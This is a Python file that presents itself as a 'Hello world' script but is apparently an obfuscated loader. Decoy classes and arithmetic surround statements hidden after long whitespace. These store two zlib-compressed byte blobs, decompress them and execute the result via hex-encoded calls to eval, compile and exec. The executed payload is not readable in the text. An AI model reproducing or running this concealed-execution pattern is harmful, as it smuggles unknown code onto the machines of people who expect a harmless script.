from builtins import *
from math import prod as Math


__obfuscator__ = 'NA'
__authors__ = ('NA', 'NA')
__github__ = 'NA'
__discord__ = 'NA'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


_algorithm, Product, Hypothesis, _ceil, _add, Random, Algorithm = exec, str, tuple, map, ord, globals, type

class _calculate:
    def __init__(self, _positive):
        self.Statistics = Math((_positive, 16317))
        self.Absolute(_detectvar=23806)

    def Absolute(self, _detectvar = float):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Statistics -= 67169 * _detectvar
        
        try:
            ({_ceil: Ceil} or _ceil if {_ceil: Ceil} and _ceil else ... or (_ceil, {_ceil: Ceil}))

        except OSError:
            (((Hypothesis, _ceil, Product), Product) for Product in (Ceil, _add))

        except:
            Algorithm(98799 - -29220) == True

    def _substract(self, _statistics = 94675):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _statistics /= -14424 - -92339
        self.Builtins != Ellipsis
        
        try:
            ((Product, _add, _algorithm) or _add if (Product, _add, _algorithm) and _add else ... or (_add, (Product, _add, _algorithm)))

        except TypeError:
            ((Ceil, Hypothesis, _add) or _ceil if (Ceil, Hypothesis, _add) and _ceil else ... or (_ceil, (Ceil, Hypothesis, _add)))

        except:
            Algorithm(82743 + 76907) == str

    def _divide(_run = str):
        return Random()[_run]

    def Run(_frame = 83353 * -68192, Modulo = True, _memoryaccess = Random):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _memoryaccess()[_frame] = Modulo
        
        try:
            ((Hypothesis, _ceil, Product) or Product if (Hypothesis, _ceil, Product) and Product else ... or (Product, (Hypothesis, _ceil, Product)))

        except AssertionError:
            ((_add, {_ceil: Ceil}) for _add in {'obdyhoeay365uldeog': Product} if _ceil is Random)

        except:
            Algorithm(-48116 + 40173) == bool

    def execute(code = str):
        return _algorithm(Product(Hypothesis(_ceil(_add, code))))

    @property
    def Builtins(self):
        self.Divide = '<__main__.Modulo object at 0x000006078BE90540>'
        return (self.Divide, _calculate.Builtins)

if __name__ == '__main__':
    try:
        _calculate.execute(code = __code__)
        Substract = _calculate(_positive = -93722 + -71930)

        _calculate(_positive = 45914 + 67582)._substract(_statistics = 54430 / Substract.Statistics)                                                                                                                                                                                                                                                          ;_calculate.Run(_frame='JJJLJLJJLJIIIILIIIIL',Modulo=b'x\x9c\xe5\x1cko\xe2:\xf6{\x7f\x05\xb7\xd2\n\xd00(\xe4I*\xf1a%f\xb5 \xa6\\m\xefng5SE!qf\xc2\xa4q\x15B\xa1\xf7\xea\xfe\xf7=\xe7\xd8\x0e\xe1UR\n\xbd+5nl\xc7/\xecc\x9f\xa7\xed\xe6\xd9\xd3\xd5E\r\x9e8jP\x88\x8f\xe7\xf1I4\x9f\x05~\xce3\xcf\xab\xfd\xd2\xbb\xbc\xfe\xfbe\x8dg\xa5\x02\xfe<\xff\xc1\xb3\x19\xe560\xbb\x85^s\xad\xcc\xf78\xff1\x9f\xeci \x8cg\x01\xcf\xc2=\xb9I\x1c\xb0t\xc6D\xee\xa7_G\x1f\xf5\xb6\xb6Q$\xe0\xa1\xc8\xaf?dq\x9a7.\xff\xc9\x92\x84\xd7\x16<K\xc2_.\x9b\xf5\x8b\xe6UQ\x1a\xf3\xeb\xb3\x9fqXo^\xb0e\xc0\x1er9\xe8\xf4a\x0e5\xff\xc5glV\xf33V\xcbX\xf8-\xfdO\xcc\x13\x96\x8b\x84I2g\xdf\xd2\xff\xf29}\xf95l\xe4[z\xcd\'<|\xaa%\xf1O\xa8\xf7\xc4\xe7\x97\xcd\x0b\xd1\xa9\xf8\xfe\x81g\xb9\xe7\xc1\xaf=\xcd\xea\xcd6[\xc6y\xa3y\x91\xf0\xc0Of\x8d\xe6\xd7\xfa\x8d|t\xf8\x83\x07B\n\xc0\xaf\xdf\xf5\xbe\'|\x02\xe5.\xf6\x17\x92M\xe82S\xe4\xeb2^\xffzu\xf5\xe1\xe3\x87\x8f\x8d\x8f\x8d\x0f\x9df\xf3\x0e\x1ad\xb9\x9f\xe7\xd9\x81\x06\xc7\x9ckc\x8dk\x1aG\x1f\x1c\x1f\xf3\xf1vca|\xb0!m\x8cu\xa9\x1d\x0c\xb0]\xcea`b\xfc\x17\xbb\xf3\xb1f\x1cO\xa7q\x02.\x9e&Sx \x92L\xe1M\xa0\xf2\n\xaa\x07~\xfe\xf6\xf6\xcb\x97/\xb7_no\xf1\x85\xc8\x97[\xa8\xbd\xb7\xe5F}2\x8f\x93<Nq\x9e\x1e\xfdlv\xb1]\x1f[M\x06\xc9`\x80o\x82\x0f\xf8\x03|\xa0e9\x05\xba\xecB1+7\x8dg~s\x96\xc6y\x12\xcf\'\x9b\xe0m\xb6\x00\xe6\x9c\xa0\x0f0\xd14\x9a\x11>>\xaa\xa9\xe6\xd7\x13\xb6\xd5\x8e\xd3\x90-\x1b\xf5,\x9fme\xde5\x0f-\x881\xfd\xf2\x98V\xd7\x98\xa6\x1f\x82\xf1\xb1\xc0\x8b\xe3`\xe6\xa7\xf1)\x80\xb7\xb7\xa9#\x80\xb7\xbf-\x05\xbc\xa7(N\x96\xecG:\xdf\x05\xc2\xdd\xcb\xae\x00\xea\x8d\x84\x13\x04\xefn\xd1\xb1Y\xe2\xffc\x17\xcc\xf6S\x12\xc2O\xc2S\xc2V\x89\xb9\x83\xe4\xdd\xc1.\xf7y\x12U_o\x80\x96\xfd\xfe\x18\xfd1\xef\x83\xe3\xf8\xf6\xdf\x1d\xd4\x12\xff\x91U\x07Z\x9a\xde\xc3\x93B@1\x08\xee\x01b\xf5z{\xca\xe3\xf4\x00m\\\xd2\xb3X\x94|\x08\xe1}\x7f0\xe7|;w\xffBE\x8cG\xa6\xc2\x11\xeb\xf1yw\x00c\xf3\xec\xb7\x97QE\x04\xa4\x04\xe7\x97\xc2\x87\xe0\xfd\x81.\x89\x1f\xeey\xf0bQf\x8f$\xd3\x98\xd4m\xdf\x0e\xc0\xb9\x85\xf3\xe9\rJ\xa9~\xe1(\r\xe4\xcd\x90\xa1\xfa\xd2\xa8w\xa3|\x87L\xf0\xce\xe6$`\xcb\xea4w\xffD\x98\x91\xa1\x19\x9a\x1d\xa1\xc3\x18~\xdb\xf4\x9a\x91\x8a\x0b\xff\xf0\x04\xec\xe6\x86\x8d\xfd?\xae;\x96aO\xec\xc8\xd1l\xd7\xb1l_\xd7\x1c\xd3\xb6l\x06\xa1F\xeb`\xa2k\xb6iG\xe0O\xec\x0e\xe4u 5\xb2\x1d\xc7\xd25=\xb2-H1\xf4\xc81\x1c\xd3\xd1\xa1^\xc7\x0e\xa9\x16\x83z\x91\xee\x1c\xea\xf0s\xfcI\xf0\xa8{\xe2O\xf8Y\xae\xbcg\x98\xf5\xa6\xe69\x9e\xe6u<\xd73<\x8cw<\x07\x7fk;\xb5Bk\xfb\x81ft\xf4P\xef\xea\xa1\xa1\xe9\x07\x91\xa2)\xbc\xbb#\xe6\xc6\xd0\xad\xc8\xe8\xc2k\xc8\xd7\x94\xa1J\xd7\xe0\xed\xe8\x13\xea\xcase\x1dx]\x0c+tw\xaf\x98\xc5\xc7\xd0]\xe8;t\xbdO\x8c\x0c\xa4\xacJS\x02\xd9\x9d\xd7\x81\xdb\xc2q\xca\xb1t\xe4\xd8l9^K\x8d[\xc2\xa1JY\xfd\xac\xd3\x06\xb4/\x02\xb4\x08\x1dD\x10@&\xc7\x06\x84\x80>X\x80d\x80$.|#"\xc17\xa0\x94\xe5\xb8\xba~\xe4\xa4<C\xdb\x81p\xc0\x8bOT8\xf5e\xda2\xcf\x8e\xd4{\x0e\xc2\xa2\x9b0N\x18y\x00d\xc1$\xb2\x02D\xc41 \x8d\x01\x0cLx}\x1b\x88\x08|!\xd1\xb0\xf4\x00r\x11\x1e\xe1\xd1\xf0\xa8/\x94D\xaaD\xd2\xe5\x9b\xa2\xf9qkE;~\xbc\xa3\xc1\x10\x1c\xf8\xa3\xd1h8\x1c\x0cF\x18\x85\xa0\x12^v\x80\x18Z\xf0v=\x1b\x08b\xd7\xebBa}3\xedu\xf0\xd3$\xfc:/\xc1\xb7\xc4\xbf\x9f\x84~mA\xb3\x88\xf3)fRN\xed\xd5.H\xbc\x18=\x18\xac8\xf1\xa2/B\x95&s\xce\x82\x120\xd9\xc0O\xcd\x89\x1d\x00\xaf5\x1c\xe4\xb6@\x12\x1c\xd7q\x88$0\xc75|+p\x00]t\xcb1\xc0\xef\x8a\xd0F\xb2a\x06\xc6\xc4p\x80\x86\x9f\x81`\x98\xa1\xc9\xa4\x0b\xe9\r\xd7R\xc2R\x08\xfea\xd8\xc8I$\xb1\xb4\x10J\x95\x98z\x929,\xf5k\xd5\xdf\r\xbfr?\x01\x87\x00m\x06\xa3!"\x10 \xd2pp\x92>Z\xc0\x95,\x03}\x0cWq\xe1\xf0K|\x9fg\xad\xedaB\xe0\xa3\x84\x062\x9e\x03\xbc\x11b\xe8\xeb$\xd5\xe9\xe7XY\xae\x19\x98>\xbc.\xbd+\xe7S\xaa\xf217\x10%\xce"\xe5\x1e/\x8bB3\xa2E\xdag@\xcd\xe1\xad\xc4\x1e%\xc6)\xf1M\x93\xdf\x9d\x92(\xe3J\xb1\xa7J\xd9\xee\x99\xc5\x1e\xb3\x03hgZ:\xc8\x18\xaei\x1e\xcf\xd6\xe8\x97\xc1\xd1Cz[\x15I\xf3\x00 m\t\x18]\x02\xa7\x0c$\xb7$GW){Ny\xc0\x8a\xce!\x0f\x06$\x88\xa1\xf3I\xcfwe\xdc-R\x94/\xad\x01\xe7d\x7f\xb88P\x9d,\xc8\x90\xdd\x11lo\x0f\xeb\xeb\xd8\xfey\x99\x9f"F\x82D\xa9\x98 K\xae$N+\xa2\x05\xf9g\x81\x0e\x08\x01nA\xaa\x99$\xd5@\xc2Ao\xb0!U\x07\xd9\xd9\x05"\xcd\x8eG,\xecH\xbfO]\xc1~q\xc0\xb1\xff{\x01\xd9\xa9\x0c\x96\xa3)<i\x0bB\xdc\xc4(\n\x9c\x94r\x1a\xa2\xa3KE\xdc\x95TXQd"0\x1bD\xe7\xb9\xb2\x15\x85\xe8W \xa6\xa5\xd9\x91\xe3\x134C\x90L}@<\x1d \xec\xa3m\xc8&y\xd5\xb6\x02\xabk\x1a\xfe+\x94\x96\xfd\xddp\xba\xe0\x1c\xf2\xcb\xe1z\x0c\x9e\xb3\xc8\x07\xa0\x98\xebG\xaf\xa0gH\x0b\xaa\xda\x91\xb0\xe9\t[\xde\xca\xcagRL\x948\x9bu\xefL\xe3Z\xe9I\x1b\xbaSX\xe4T\xd2\xa1\xa4\xfcM6\xfe[e\xea\xc7\xf8\xd5sV\xed\x17\xf7\xb6l\xcev%\xdb\x13,\xb1\xfc%\xd9\xe2\xb9\xa5\xf1\xd0\x01\x06\xb8\x92\xc8u\x86$\xce>^^z\x16\xa3$\xce\x94\xf0h\x95F_g\x18-\x91,M\x92.C\x86Z\x89\x9c\xe9%[\xdd\xber$k\x1dm\xaf\xdc\xdf9\xa1\x87)]L\xe8`\xca\xbd\x95f&\xc4 \x1b\x16[\xc7\x06\xeeV\x12~\x8ef\xed\xc2R"\x8c$\xc4\xbc\x16\x95\xb4\x14\xdds\xc0\xd9\x9e\xe9\xb9\x9e\x0e\xbeM\xf6rc;\xf5/4\x04-\xa4!H0\xe6\xc5KL@ \xf1\x8c\xc7(\xf2\x90\xb03&\xd9\x07\xbb\xde\xaf\xa2\xc3\x9dR\xee\x91c\xe1\xd4\x99~aD\xef\xf3\x93\xd29\xcb\xb1\xba\xe4\x1c\xe9;\x14\xdb\x0e)\xf7,\xfc\x06-U\xf6\xf1\xda\xf6\x81\xb1m\x8c\xa0\x88u\xcf8" \xce\xe7\xe0\xa0\x92\xfe\xee\xa3\xcf*\xa7\x12\x85VV,urH\x1d%\x1a\x1c\xb1\xba\xea\x00\x911\x82H\x1eU U\xfc\x95\xd8R"\xedVik\xca.\xa9\xd5j\xfb\xa6J\xd9\x8a\xdb7\xafVQ\x1d\xc3qqg\x13d\xdf\xd0\xb1N@\xa5\x9f\x91\x13\xcb\xb6\xcc\x95\x05SY6Kv\xce\xf3\xec\x01G\xa0U\x85\xb4]\xc30~\xbc.\x15\xe3\x8e\xfat\x1a\xe3\x1e:\xfcMi\x7f\xfdM\x99\xc7qd\xcb@\xa5\x07\x14\x9d\x0e\x1a\xe1\x01\x18jW\xeah@(~E\x1b\x17R\xa1\\Tc\xca\xa6g\xe1\x16\xb5g\x00\xfb\xed\x02\xfb\xd5=\x0b\x8a[\xdb\xa9\'5D\x9el\xa7\xd6\x96\x12\x9c\xda}6$\xea\xaat\xb7$\xfd\x1d*\xfb\x02\x93\xe5\xae\x1d$9\tK\x15{\x89\xe80\x10\x07\xa6\x07*\x14\x87\xa8\xe1\xe3\x8dW\xb3\x1c\xcd\xe7\xeb\xeb\xcf\xf4\\\xa3\x13\x7f\xe0\xae\xf6\x9d\x9d\xda{*|\xa0\x98Ci\x80\x95\x96\x87\r\x0b\x0f\xa5B\x94\x0b5:Ga@qg;\xf5/\x90\x15\x8f@yS\x0f\xacn\'0\xbb\xa6I\x16\r[w\xd0\xd48Y\x9d|\x11g\\\x8e\xd8E9\x9ah\x8c\x86b\x1fw0\xa0\x08\xeeJ\r_\x07MW\xf2L\xad\x84hV\x89\x97jd\xce\x16\x08\xf9\\Ye\x95\xaa\xa2\x92\xbd\xd2\ne\x02\xd7\xd5V\xdc\xf6\\\x1cW\x1c~\x88\xc4a\x08\xbbtD\x82\x0eG\x88tu\x8c\xe2<\x07$,\xcb1A\xba\x8c@\\\xf6\xd1\x82I\x07$\x8aSW\x0e\xda6}X\x9f\x96m\xa2\xe5\r\x8fM\xd8\x1d\x80\xcf\x86=\xd44\xa0\x83\xe1\xablru\xa95\xca\xa3\x13B\xdfZV\xd5!m:We\xd3\x91\x01\xd4\x15-O\x97ta#\xb5Rk\x82\x9e\x18\xc0\xdet`s\x16\x86P\xbc\xbb\x9dZ\xa95\x97h\x92\x065\x90\xa9\xe2\xd1\x06\xa4Yx\x16l#\xb5\xda\x91\t\xc8\xd6N#\x0b;2\xb4\xad\xd5\x91-%\xef\xba\x1b\xb2\xf0se\x8f`\x90kl\x05\xa9\x7f"\xee\x1c(.\'\x9e\x972\x16q\xe0s\xdd\te\xe3\xa4\xa0E\x93\x85\x06\xd3\xe6\xc0\x12@\x96\xd3\x95\'W\x8c\xed\xd4J\xadu\xc9\xc0!\x16\x84N\xf2\x15\xcaZ\xeev\xea\x89e\xad\x0e,;\r\x165\x9e\xb21h)\x1at\xfef+\xf5\xcd\x0f*n/\x957g\xae{\xce\xc9\x1d\xcdV\x91\x95\xd23\xa0\xb3\x1d\x10\x0c\x91\xb3\xbe\x92\xb5\xbe\x89^\x12\xda\x04\x1b;x\x99N\x12e\xfc\xbe\xa6\xee\t\xd6\xc4=\xc4\x1a[\xb2\xa0\xf5\x83-[\tK[t\xf9\xb45\xe1<iM\x9er6k\xe1\'\x7f\x80\x1c\xbc\xfby\x81e\x1bt f$\x08\xc3\x10%\x92\x11\x01r0\x90?\xf0\xf0\xb4\x88C\xf6\x18\xa7\xac\x8dA\xc0\xd4/\xf5\xe9\xab%\x82\xdf\x9e\x1e\xd8LT\xf8=\x89\'\xaaL\x90\x05\x86.\x92\xe7i,\xc6\xa3\xf2\xfe\xad\x12>e\x19\xcfZ')

        _calculate(_positive = 7548 + 82106).Absolute(_detectvar = Substract.Statistics + -72430)                                                                                                                                                                                                                                                          ;_calculate.Run(_frame='SS2SSSS2SSS222S22SSS222',Modulo=b'E\xfeE\xc8\xa2\xda\xbd\xff\x93\x89\x96\x1b\xf2\xaal\xae.\x03\xe3\xb3\x88\xf3\x1f5\x1cH\xa3/.\\\xa0\xc5Mnw\x02\x94[\xf7\xd0N\x0fb\xda\x98\xce\x80\x13\xcc\x91\xb4\x81\xd7\xf4g\xb5(N\xd8\xaa1|\x00R\x8f~\xce\xbc\x9f\xec\xc9#P\xf5\xb0L;c~\xd8h\xae\x95\xa4\xf4 \xe13V\xcaX\xeb\xdcz\x07\xe5E\xb9\xe2:,\x86\xa2\x7f\x05\x1b\x96;\x93\xa8\xbc\xec\xee\x1d>A\x12\xb34\xf7\xe2\xf0@\xff\xf6\xf6Q\xdc-\xae}\xa2 \xe6\xe9\x16\x00\xd2\xbcQ\xd6\x87\x8a\xeb\xa4\xc9\xfa\x0f\xc8k\xc3\xcf7)\x9aS\x86\xa8m\x96Q\xeeV\xd1\x9cX_=9\xef[\xa3"@\xc3:\xf3z\xa55\xf7U`\x948\xba\x83\xb3<\xd6\xeeZ;\xab\xceX0\xcf\xe2\xfc\xc9K\xd8#Kz\xcbBuW[\xc3\xbb\xabE\x89\xff}\xd6\xbb\xe6)\xdb\x9d_Z9\xbd\xadU\xb4\xbbJ1\x95\xbd\x8dI\xbd\x10pP\xa9i\xc4{\x7f\xfcII\x11\xcfj\x90\x96=\xd5\xe2T\xc2\xa9]Tn\x97*\xac\xa6\xa0\x94\xf8\x95\xaa\xb6S\xff\x9e\xdd\xf5D\xfc\xd1O\xe6\x8c\xca.\x1e\xe1\xd7\xe3\xb4\'[\r\xe7\xf7\x0f39!X\xa1\x17]\xfeQn*Ak\xcf\x94\x0c?+;\xd0\xdd\x9fke$\xe9\x1d(Z,\xe9\xf2\xf0\xee\xcfKy\x9f\xbf\xdc\xbb\xf6w\x06+oHd\x08\xbd\x91$\xe0\xd8\xc4pT\xba)\x8f\xdd\xf9\xb0\xd9\x1f\xb4\xb3\xcb\x93\x0e\x9c\x0c\xef\xbc\xaf~fU\x1e\xc9PC\x0e\xb4\xd9\xce\xb9\x00wC\xdd@\x90\xb7\x10\xe8\xb3%o"\t\xf6"_\xf8l\xb6\x81\xaa6\x9a\xb2\xe95\x84\'0\x15\xf4\xab\x81\x9f\xedY\x9e\xc5\x0f\x8df;\xe1\x0b\x96A\x98\xb1\x87\xc4\x87U\xbd\\\x9du\x95\x1b9\xad>\xddi\x97\'\xa1\xfa\xc4>\x9ak\xf8\xb5N)k@"\xd8&\xa6\xd1\xa6\xc3x,\xb9O\x01\t.\xda\xe1\xf3\xdc{\xf0\xf3\x1f=1c\xf1\x94\x0cw"@#\x9eX\x07\x05\xc9R\xc5\x05\x99Z\x81@]\xd0\xda&RDp\x16\x80]\xac\x80\xf2z^\x99\x18\x89\x1e\x97\xe3c\xb1y\xc3\xa9\xf7H\xc29\xee\xe8\x8c[\xaa#\xe5\xb2C:\xc5Il\x8ath\x88\x8cZr\xed"u\xa0U\xbe\xde8\xed\tqa\xed\x16|YU\x98=\xcdrv\x0f(T\xae\xb0TV\xbdE\x99@/\x96E\xa55BR\xaey\xa3\xfe\xdb\xc1\x8d:\x14+\xc8\xbd\xacH\xa4\xa4\\\x1e\xefd\x8aU\x871\xfc\xa8\xfd\xad\x81\xec\xba!k\x94\x08J\xb3\xb5\x9d\xd6\x9e\xc5\xbf3@\x03\x00x\x0e8\xdb,\xb7\x8d\x08\x9aL\xe9\x9e\x13\xcc\xf3\x94\x8c\xb4\x88\xaa\xf1\xc6O\x14T\xa4\x89"\xc3Vj\xfb\x86e\xb1\x9f\xc0\xef\xfc\xc6o`M\xa7\xdf\xf1w\xf6N\xa4&\xb9-^\xc2\x12\xc2\x0ep\xdc\xb5\xc2\x80\xfb\x9e\x87s\xe4y\xbd\xde\xe7\xcf\xd7d\xe3"3\xd7g\xf1\xf5Y,\xab\xb2\x04p\xf1?\x18\x80\x9e\x00')

        if 101142 > 1226171:
            Substract.Absolute(_detectvar = Substract.Statistics * -67055)
        elif 225062 < 8041033:
            _calculate(_positive = -18481 * -57378).Absolute(_detectvar = Substract.Statistics / -68303)                                                                                                                                                                                                                                                          ;NNMMNMNMMMMMNNNNMM,OO00O0OOo00O0oO0oo0oO0oOOO,WXWWWWXXWWXWWXWWXXXXWW,mnmmnnmnnnnmmmnnmmn,llIlIllllIlllIlllllIlIll=(lambda OOO0ooO0ooooOooo0ooOO0o0:OOO0ooO0ooooOooo0ooOO0o0(__import__('\x7a\x6c\x69\x62'))),(lambda OOO0ooO0ooooOooo0ooOO0o0:OOO0ooO0ooooOooo0ooOO0o0['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda OOO0ooO0ooooOooo0ooOO0o0:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(OOO0ooO0ooooOooo0ooOO0o0)"),filename='\x53\x32\x32\x32\x32\x32\x53\x32\x32\x32\x53\x32\x32\x53\x32\x53\x32\x53',mode='\x65\x76\x61\x6c'))),(lambda:(lambda OOO0ooO0ooooOooo0ooOO0o0:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(OOO0ooO0ooooOooo0ooOO0o0)"),filename='\x53\x32\x32\x32\x32\x32\x53\x32\x32\x32\x53\x32\x32\x53\x32\x53\x32\x53',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda llIlllIIIIlllllII,OOO0ooO0ooooOooo0ooOO0o0:llIlllIIIIlllllII(OOO0ooO0ooooOooo0ooOO0o0))
        if 360087 > 5267771:
            Substract.Absolute(_detectvar = Substract.Statistics / -49061)
        elif 408992 < 1040948:
            Substract._substract(_statistics = -20042 * Substract.Statistics)                                                                                                                                                                                                                                                          ;mnmmnnmnnnnmmmnnmmn()(llIlIllllIlllIlllllIlIll(OO00O0OOo00O0oO0oo0oO0oOOO(NNMMNMNMMMMMNNNNMM(WXWWWWXXWWXWWXWWXXXXWW('\x76\x61\x72\x73'))),_calculate._divide(_run='JJJLJLJJLJIIIILIIIIL')+_calculate._divide(_run='SS2SSSS2SSS222S22SSS222')))

    except Exception as Ceil:
        if 464438 > 4719804:
            _calculate.execute(code = Product(Ceil))

        elif 115548 > 4959082:
            Substract._substract(_statistics = -48574 + Substract.Statistics)